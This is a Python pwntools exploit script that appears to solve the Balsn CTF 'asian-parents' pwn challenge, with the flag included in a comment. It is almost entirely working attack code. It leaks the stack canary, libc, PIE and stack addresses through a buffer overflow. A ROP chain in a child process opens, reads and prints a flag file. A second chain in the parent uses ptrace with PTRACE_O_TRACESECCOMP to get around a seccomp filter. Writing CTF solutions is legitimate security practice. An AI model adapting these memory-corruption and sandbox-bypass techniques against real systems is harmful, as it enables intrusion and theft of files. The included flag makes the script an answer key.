import struct

from pwn import *


def connect():
    return remote("asian-parents.balsnctf.com", 7777)
    # return remote("localhost", 7777)


PTRACE_CONT = 7
PTRACE_SEIZE = 0x4206
PTRACE_O_TRACESECCOMP = 0x00000080
O_RDONLY = 0


def main():
    with connect() as tube:
        # leak cookie
        tube.sendlineafter(b"Please assign some work to your failure:\n", b"A" * 0x88)
        tube.recvuntil(b"Current work for your failure: ")
        tube.recv(0x89)
        (cookie,) = struct.unpack("<Q", b"\x00" + tube.recv(7))
        print(f"cookie = 0x{cookie:x}")

        # leak libc
        tube.sendlineafter(b"> ", b"0")
        tube.sendlineafter(b"Please assign some work to your failure:\n", b"A" * 0x97)
        tube.recvuntil(b"Current work for your failure: ")
        tube.recv(0x98)
        (retaddr,) = struct.unpack("<Q", tube.recv(6) + b"\x00\x00")
        print(f"retaddr = 0x{retaddr:x}")
        libc = retaddr - 0x29D90
        print(f"libc = 0x{libc:x}")
        assert libc & 0xFFF == 0

        # leak pie
        tube.sendlineafter(b"> ", b"0")
        tube.sendlineafter(b"Please assign some work to your failure:\n", b"A" * 0xA7)
        tube.recvuntil(b"Current work for your failure: ")
        tube.recv(0xA8)
        (main,) = struct.unpack("<Q", tube.recv(6) + b"\x00\x00")
        print(f"main = 0x{main:x}")
        pie = main - 0x18EF
        print(f"pie = 0x{pie:x}")
        assert pie & 0xFFF == 0

        # leak stack
        tube.sendlineafter(b"> ", b"0")
        tube.sendlineafter(b"Please assign some work to your failure:\n", b"A" * 0xB7)
        tube.recvuntil(b"Current work for your failure: ")
        tube.recv(0xB8)
        (buf,) = struct.unpack("<Q", tube.recv(6) + b"\x00\x00")
        buf -= 0x1A8
        print(f"buf = 0x{buf:x}")

        rdi = libc + 0x2A3E5
        rdx_rcx_rbx = libc + 0x108B13
        ptrace = libc + 0x11C140
        loop = libc + 0x1114DB
        pid = pie + 0x4064
        edx_qq = (
            libc + 0x194E2D
        )  # mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
        rcx = libc + 0x8C6BB
        rsi_qq = libc + 0x16382D  # mov rsi, rdx ; add rdi, 0x10 ; jmp rcx
        sleep = libc + 0xEA5E0
        puts = libc + 0x80ED0
        str_ld_so = pie + 0x318
        str_cxa_finalize = pie + 0x699
        system = libc + 0x50D60
        str_bin_sh = libc + 0x1D8698
        nop = libc + 0x29CD6
        wait4 = libc + 0xEA440
        rsi = libc + 0x2BE51
        exit = libc + 0x455F0
        rbp = libc + 0x2A2E0
        bss = pie + 0x4000
        open = libc + 0x114690
        save_rax_qq = libc + 0x1659f4  # mov qword ptr [rsi + 0x10], rax ; ret
        rdi_qq = libc + 0x7f7cd  # mov rdi, qword ptr [rdi + 0xe0] ; jmp rax
        rax = libc + 0x45eb0
        read = libc + 0x114980
        write = libc + 0x114a20

        # rop child
        tube.sendlineafter(b"> ", b"0")
        tube.sendlineafter(
            b"Please assign some work to your failure:\n",
            flat(
                {
                    0: b"/home/asianparent/flag.txt\0",
                    0x88: struct.pack("<Q", cookie),
                    0x98: b"".join(
                        (
                            # sleep(1)
                            struct.pack("<QQQ", rdi, 1, sleep),
                            # we can fool only one syscall
                            struct.pack("<QQQQQ", rdi, buf, rsi, O_RDONLY, open),
                            # *bss = fd
                            struct.pack("<QQQ", rsi, bss - 0x10, save_rax_qq),
                            # rdi = *bss
                            struct.pack("<QQQQQ", rax, rsi, rdi, bss - 0xe0, rdi_qq),
                            # read(fd, bss, 1024)
                            struct.pack("<QQQQQQ", bss, rdx_rcx_rbx, 1024, 0, 0, read),
                            # write(1, bss, 1024)
                            struct.pack("<QQQQQQQQQ", rdi, 1, rsi, bss, rdx_rcx_rbx, 1024, 0, 0, write),
                            # exit(0)
                            struct.pack("<QQQ", rdi, 0, exit),
                        ),
                    ),
                },
            ),
        )

        # rop parent
        tube.sendlineafter(b"> ", b"1")
        tube.sendlineafter(
            b"Please enter some notes:\n",
            flat(
                {
                    0x88: struct.pack("<Q", cookie),
                    0x98: b"".join(
                        (
                            # edx = pid
                            struct.pack("<QQQQQ", rdx_rcx_rbx, 0, pid, 0, edx_qq),
                            # rsi = pid
                            struct.pack("<QQQ", rcx, rdi, rsi_qq),
                            # ptrace(PTRACE_SEIZE, pid, 0, PTRACE_O_TRACESECCOMP)
                            struct.pack(
                                "<QQQQQQ",
                                PTRACE_SEIZE,
                                rdx_rcx_rbx,
                                0,
                                PTRACE_O_TRACESECCOMP,
                                0,
                                ptrace,
                            ),
                            # wait4(-1, NULL, 0, NULL)
                            struct.pack(
                                "<QQQQQQQQQ",
                                rdi,
                                0xFFFFFFFFFFFFFFFF,
                                rsi,
                                0,
                                rdx_rcx_rbx,
                                0,
                                0,
                                0,
                                wait4,
                            ),
                            # exit(0)
                            struct.pack("<QQQ", rdi, 0, exit),
                        ),
                    ),
                },
            ),
        )

        # go
        tube.sendlineafter(b"> ", b"3")

        tube.interactive()
        # BALSN{4s1an_par3nt5_us3d_7o_0RW_w1th0u7_0p3n_sysca1l}


if __name__ == "__main__":
    main()
